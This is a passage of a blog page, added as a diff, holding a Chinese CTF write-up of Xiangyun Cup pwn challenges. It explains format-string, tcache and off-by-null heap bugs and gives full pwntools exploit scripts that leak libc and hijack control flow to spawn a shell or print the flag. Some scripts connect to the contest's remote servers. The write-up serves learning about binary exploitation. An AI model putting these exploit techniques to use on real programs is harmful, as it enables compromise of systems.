@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="祥云杯部分pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xiangyuncup">
+<meta property="og:url" content="http://example.com/2021/09/03/xiangyuncup/index.html">
+<meta property="og:site_name" content="ABf1ag&#39;s blog">
+<meta property="og:description" content="祥云杯部分pwn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/09/03/xiangyuncup/image-20210903191722945.png">
+<meta property="og:image" content="http://example.com/2021/09/03/xiangyuncup/image-20210903195246777.png">
+<meta property="og:image" content="http://example.com/2021/09/03/xiangyuncup/image-20210903195652440.png">
+<meta property="og:image" content="http://example.com/2021/09/03/xiangyuncup/image-20210903200715050.png">
+<meta property="og:image" content="http://example.com/2021/09/03/xiangyuncup/image-20210903201559653.png">
+<meta property="og:image" content="http://example.com/2021/09/03/xiangyuncup/image-20210904111952666.png">
+<meta property="article:published_time" content="2021-09-03T11:09:33.000Z">
+<meta property="article:modified_time" content="2021-09-04T03:25:14.415Z">
+<meta property="article:author" content="ABf1ag">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/09/03/xiangyuncup/image-20210903191722945.png">
+
+<link rel="canonical" href="http://example.com/2021/09/03/xiangyuncup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>xiangyuncup | ABf1ag's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ABf1ag's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section">Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section">Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section">links</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/03/xiangyuncup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ABf1ag">
+      <meta itemprop="description" content="CTF to learn,not learn to CTF">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ABf1ag's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          xiangyuncup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-09-03 19:09:33" itemprop="dateCreated datePublished" datetime="2021-09-03T19:09:33+08:00">2021-09-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-09-04 11:25:14" itemprop="dateModified" datetime="2021-09-04T11:25:14+08:00">2021-09-04</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="祥云杯部分pwn"><a href="#祥云杯部分pwn" class="headerlink" title="祥云杯部分pwn"></a>祥云杯部分pwn</h3><span id="more"></span>
+
+<p><em>两周前打的一次比赛，一直想写wp记录一下比赛的过程，奈何杂事太多，自己也静不下心来，因此一直拖到了现在。</em></p>
+<h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><p>格式化字符串漏洞，漏洞点如下：</p>
+<p><img src="/2021/09/03/xiangyuncup/image-20210903191722945.png" alt="image-20210903191722945"></p>
+<p>其中scanf和printf相似，所不同的是scanf中的%s可以直接写向栈上的指针指向的内存区域，因此我们就可以进行任意地址写操作。又再栈中发现_IO_2_1_stdoutd的地址，所以我们直接打stdout泄露libc_base，再利用栈中保存的栈上的地址，我们直接写入system函数地址。</p>
+<p>完整exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./note&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span><br><span class="line">#io = remote(&#x27;47.104.70.90&#x27;,25315)</span><br><span class="line">libc = ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(size,context):</span><br><span class="line">    io.sendlineafter(&#x27;choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;size: &#x27;,str(size))</span><br><span class="line">    io.sendafter(&#x27;content: &#x27;,context)</span><br><span class="line"></span><br><span class="line">def say(say,context):</span><br><span class="line">    io.sendlineafter(&#x27;choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;say ? &#x27;,say)</span><br><span class="line">    io.sendafter(&#x27;? &#x27;,context)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    io.sendlineafter(&#x27;choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line">    </span><br><span class="line">def exp():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    say(&#x27;%7$s&#x27;,p64(0xfbad1887)+p64(0)*3+&#x27; &#x27;)</span><br><span class="line">    raw_input()</span><br><span class="line">    io.sendline(&#x27;3&#x27;)</span><br><span class="line">    io.recv(0x80)</span><br><span class="line">    stdin=u64(io.recvuntil(&#x27;\x7f&#x27;,timeout=1)[-6:].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">    libc_base = stdin - libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]    </span><br><span class="line">    print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">    system  = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">    pop_rdi = libc_base + 0x0000000000021112</span><br><span class="line">    binsh = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line"></span><br><span class="line">    say(&#x27;%17$s&#x27;,&#x27;a&#x27;*8+p64(pop_rdi)+p64(binsh)+p64(system)+&#x27; &#x27;)</span><br><span class="line">    raw_input()</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    io.sendline(&#x27;1&#x27;)</span><br><span class="line">    io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+
+<h3 id="lemon-pwn"><a href="#lemon-pwn" class="headerlink" title="lemon_pwn"></a>lemon_pwn</h3><p>输入一串数字，如果满足要求，可以将flag写入栈中。因为没有设置种子，所以rand()是伪随机数。</p>
+<p><img src="/2021/09/03/xiangyuncup/image-20210903195246777.png" alt="image-20210903195246777"></p>
+<p>利用如下脚本获得v1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for buf in range(0xa7778200000,0x100000000000):</span><br><span class="line">    v1 = (buf&gt;&gt;32) ^ (buf&amp;0xffffffff) | (3 * (buf&amp;0xffffffff) - (buf&gt;&gt;32)) &amp; ((buf&amp;0xffffffff) // (buf&gt;&gt;32))</span><br><span class="line">    print(hex(v1))</span><br><span class="line">    if v1 == 0x783D9E5F:</span><br><span class="line">        print(hex(buf))</span><br><span class="line">        break</span><br><span class="line">print(&#x27;end&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>进入主逻辑，发现有沙箱，禁用了execve函数，因此我们使用open，read，write输出flag</p>
+<p><img src="/2021/09/03/xiangyuncup/image-20210903195652440.png" alt="image-20210903195652440"></p>
+<p>在color操作中发现可以对指针更改并且可以写，但只能使用一次，我们利用这次机会来控制tcache_struct。</p>
+<p><img src="/2021/09/03/xiangyuncup/image-20210903200715050.png" alt="image-20210903200715050"></p>
+<p>控制tcache_struct后就是堆风水的问题了，我们连续打3次stdout，第一次获得libc_base，第二次利用libc中的environ得到stack_addr，最后一次直接泄露flag。本题能连续打三次stdout包含着很大的运气成分。</p>
+<p>完整exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process([&#x27;./ld-2.26.so&#x27;,&#x27;./lemon_pwn&#x27;],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.26.so&#x27;&#125;)</span><br><span class="line"></span><br><span class="line">libc = ELF(&#x27;./libc-2.26.so&#x27;)</span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(index,name,length,context):</span><br><span class="line">    io.sendlineafter(&#x27;choice &gt;&gt;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;index of your lemon: \n&#x27;,str(index))</span><br><span class="line">    io.sendafter(&#x27;name your lemon: \n&#x27;,name)</span><br><span class="line">    io.sendlineafter(&#x27;length of message for you lemon: \n&#x27;,str(length))</span><br><span class="line">    if length &lt;= 1024:</span><br><span class="line">	io.sendafter(&#x27;message: \n&#x27;,context)</span><br><span class="line"></span><br><span class="line">def eat(index):</span><br><span class="line">    io.sendlineafter(&#x27;choice &gt;&gt;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;index of your lemon : \n&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def throw(index): </span><br><span class="line">    io.sendlineafter(&#x27;choice &gt;&gt;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;index of your lemon : \n&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def color(index,context):</span><br><span class="line">    io.sendlineafter(&#x27;choice &gt;&gt;&gt; &#x27;,&#x27;4&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;index of your lemon  : \n&#x27;,str(index))</span><br><span class="line">    io.sendafter(&#x27;draw and color!\n&#x27;,context)</span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">def exp():</span><br><span class="line">    io.sendlineafter(&#x27;me?\n&#x27;,&#x27;yes&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27; number: \n&#x27;,p32(0x78348c28)+p8(0x77))</span><br><span class="line">    io.recvuntil(&#x27;first: \n&#x27;)</span><br><span class="line">    io.sendline(&#x27;f1ag&#x27;)</span><br><span class="line">    </span><br><span class="line">    add(1,&#x27;flag\n&#x27;,48,&#x27;aaaa\n&#x27;)</span><br><span class="line">    add(2,&#x27;a\n&#x27;,144,&#x27;a\n&#x27;)</span><br><span class="line">    add(3,&#x27;a\n&#x27;,96,&#x27;a\n&#x27;)</span><br><span class="line">    add(0,&#x27;f1ag\n&#x27;,32,&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">    eat(1)</span><br><span class="line">    io.recvuntil(&#x27;eat eat eat &#x27;)</span><br><span class="line">    addr=int(io.recv(5))</span><br><span class="line">    print(hex(addr))</span><br><span class="line">    color(1,&#x27;b&#x27;*0x10+p32(0x40)+p32(1)+p16(addr-0x250))</span><br><span class="line">    throw(3)</span><br><span class="line">    throw(1)</span><br><span class="line">    add(1,&#x27;a\n&#x27;,576,&#x27;\x00&#x27;*8+&#x27;\x07&#x27;+&#x27;\x00&#x27;*0x37)</span><br><span class="line"></span><br><span class="line">    throw(2)</span><br><span class="line">    throw(1)</span><br><span class="line">    #add(3,&#x27;a\n&#x27;,16,&#x27;a\n&#x27;)</span><br><span class="line">    add(1,&#x27;a\n&#x27;,576,&#x27;\x00&#x27;*7+&#x27;\x07&#x27;+&#x27;\x00&#x27;*0x38+p64(0)*5+p16(addr+0xd0))</span><br><span class="line">    add(2,&#x27;a\n&#x27;,96,&#x27;a\n&#x27;)</span><br><span class="line">    throw(1)</span><br><span class="line">    add(1,&#x27;a\n&#x27;,576,&#x27;\x00&#x27;*7+&#x27;\x00&#x27;+&#x27;\x00&#x27;*0x38+p64(0)*5+p16(0x86ed))</span><br><span class="line">    add(2,&#x27;a\n&#x27;,96,&#x27;a&#x27;*0x33+p64(0xfbad1887)+p64(0)*3+&#x27;\x88&#x27;)</span><br><span class="line"></span><br><span class="line">    stdin=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">    libc_base = stdin-libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]</span><br><span class="line">    stdout = libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]</span><br><span class="line"></span><br><span class="line">    print(hex(libc_base))</span><br><span class="line">    environ = libc_base+libc.symbols[&#x27;_environ&#x27;]</span><br><span class="line">    throw(1)</span><br><span class="line">    add(1,&#x27;a\n&#x27;,576,&#x27;\x00&#x27;*7+&#x27;\x00&#x27;+&#x27;\x00&#x27;*0x38+p64(0)*5+p64(stdout-0x33))</span><br><span class="line">    throw(0)</span><br><span class="line">    add(2,&#x27;a\n&#x27;,104,&#x27;a&#x27;*0x33+p64(0xfbad1887)+p64(0)*3+p64(environ)+p64(environ+8))</span><br><span class="line"></span><br><span class="line">    stack=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-0x180</span><br><span class="line">    print(hex(stack))</span><br><span class="line">    add(0,&#x27;b&#x27;,48,&#x27;a\n&#x27;)</span><br><span class="line">    throw(1)</span><br><span class="line">    add(1,&#x27;a\n&#x27;,576,&#x27;\x00&#x27;*7+&#x27;\x00&#x27;+&#x27;\x00&#x27;*0x38+p64(0)*5+p64(stdout-0x33))</span><br><span class="line">    throw(0)</span><br><span class="line">    add(2,&#x27;a\n&#x27;,104,&#x27;a&#x27;*0x33+p64(0xfbad1887)+p64(0)*3+p64(stack-4)+p64(stack+0x28))</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    io.interactive()</span><br><span class="line">    </span><br><span class="line">i=0</span><br><span class="line">while(i!=0x20):</span><br><span class="line">   try:</span><br><span class="line">	#io=process([&#x27;./ld-2.26.so&#x27;,&#x27;./lemon_pwn&#x27;],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.26.so&#x27;&#125;)    </span><br><span class="line">	io = remote(&#x27;47.104.70.90&#x27;,34524)</span><br><span class="line">        exp()</span><br><span class="line">	i+=1</span><br><span class="line">   except:</span><br><span class="line">	io.close()</span><br><span class="line">	i+=1</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwdFree"><a href="#pwdFree" class="headerlink" title="pwdFree"></a>pwdFree</h3><p>常规的一道堆题，off-by-null，注意在写入数据时要和泄露出来的key异或。</p>
+<p><img src="/2021/09/03/xiangyuncup/image-20210903201559653.png" alt="image-20210903201559653"></p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io = process(&#x27;./pwdFree&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span><br><span class="line">io = remote(&#x27;47.104.71.220&#x27; ,38562)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(name,length,context):</span><br><span class="line">    io.sendlineafter(&#x27;Choice:\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;ID You Want Save:&#x27;,name)</span><br><span class="line">    io.sendlineafter(&#x27;Length Of Your Pwd:&#x27;,str(length))</span><br><span class="line">    io.sendafter(&#x27;Your Pwd:&#x27;,context)</span><br><span class="line"></span><br><span class="line">def edit(index,context):</span><br><span class="line">    io.sendlineafter(&#x27;Choice:\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">    raw_input()</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">    raw_input()</span><br><span class="line">    io.send(context)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    io.sendlineafter(&#x27;Choice:\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Check:\n&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">    io.sendlineafter(&#x27;Choice:\n&#x27;,&#x27;4&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27; Delete:\n&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    add(&#x27;0&#x27;,0xf8,&#x27;0\n&#x27;)#0</span><br><span class="line">    io.recvuntil(&#x27;Save ID:&#x27;)</span><br><span class="line">    io.recv(8)</span><br><span class="line">    key=u64(io.recv(8))</span><br><span class="line">    print(&#x27;key&#x27;,hex(key))</span><br><span class="line">    add(&#x27;1&#x27;,0x38,&#x27;1\n&#x27;)#1</span><br><span class="line">    add(&#x27;2&#x27;,0x38,&#x27;2\n&#x27;)#2</span><br><span class="line">    add(&#x27;3&#x27;,0x38,&#x27;3\n&#x27;)#3</span><br><span class="line">    add(&#x27;4&#x27;,0x38,&#x27;4\n&#x27;)#4</span><br><span class="line">    add(&#x27;5&#x27;,0xf8,&#x27;5\n&#x27;)#5</span><br><span class="line">    add(&#x27;6&#x27;,0xf8,&#x27;6\n&#x27;)#6</span><br><span class="line">    add(&#x27;7&#x27;,0xf8,&#x27;7\n&#x27;)#7</span><br><span class="line">    dele(6)</span><br><span class="line">    add(&#x27;6&#x27;,0xf8,&#x27;6&#x27;*0xf0+p64(0x400^key)+&#x27;\n&#x27;)#6</span><br><span class="line"></span><br><span class="line">    for i in range(7):</span><br><span class="line">	add(&#x27;8&#x27;,0xf8,&#x27;8\n&#x27;)#8~14</span><br><span class="line">    for i in range(7):</span><br><span class="line">	dele(14-i)</span><br><span class="line"></span><br><span class="line">    dele(0)</span><br><span class="line">    dele(7)#merge 0x500</span><br><span class="line">    for i in range(7):</span><br><span class="line">	add(&#x27;0&#x27;,0xf8,&#x27;0\n&#x27;)#0,7,8~12</span><br><span class="line"></span><br><span class="line">    add(&#x27;13&#x27;,0xf8,&#x27;1\n&#x27;)#13</span><br><span class="line">    show(1)</span><br><span class="line">    io.recvuntil(&#x27;Pwd is: &#x27;)</span><br><span class="line">    malloc_hook=(u64(io.recv(8))^key)-96-16</span><br><span class="line">    libc_base=malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">    print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">    free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">    system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">    add(&#x27;14&#x27;,0x38,&#x27;14\n&#x27;)#14</span><br><span class="line">    dele(14)</span><br><span class="line">    edit(1,p64((free_hook-8)))</span><br><span class="line">    add(&#x27;14&#x27;,0x38,&#x27;14\n&#x27;)</span><br><span class="line">    add(&#x27;15&#x27;,0x38,(p64(0x68732f6e69622f^key))+p64((system)^key)+&#x27;\n&#x27;)</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    dele(15)</span><br><span class="line">    io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwdPro（glibc-2-31下的largebin-attack）"><a href="#pwdPro（glibc-2-31下的largebin-attack）" class="headerlink" title="pwdPro（glibc-2.31下的largebin attack）"></a>pwdPro（glibc-2.31下的largebin attack）</h3><p>这道题就很有意思了，我们先回顾一下libc-2.26以下的largebin attack的操作，由于largebin中是按照大小存放的，假设我们的largebin chunk的大小满足在其中的largebin chunk的大小之间，那么其插入操作就是将它自己的fd和bk指针分别指向两边chunk的位置，然后更小chunk的bk指针和更大chunk的fd指针指向插入其中间的chunk；fd_nextsize,bk_nextsize指针的操作和fd，bk相似。其代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line"></span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">              #victim为要插入的largrbin chunk，fwd为更小的largebin chunk</span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">          bck = fwd-&gt;bk;</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>因此我们改变<strong>更小chunk</strong>的bk和bk_nextsize指针，再插入一个更大的largebin chunk，就可以修改任意地址的值（但不能指定值）。</p>
+<p>由于libc-2.30增加了两个新的保护，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">    malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);</span><br><span class="line">if (bck-&gt;fd != fwd)</span><br><span class="line">    malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);</span><br></pre></td></tr></table></figure>
+
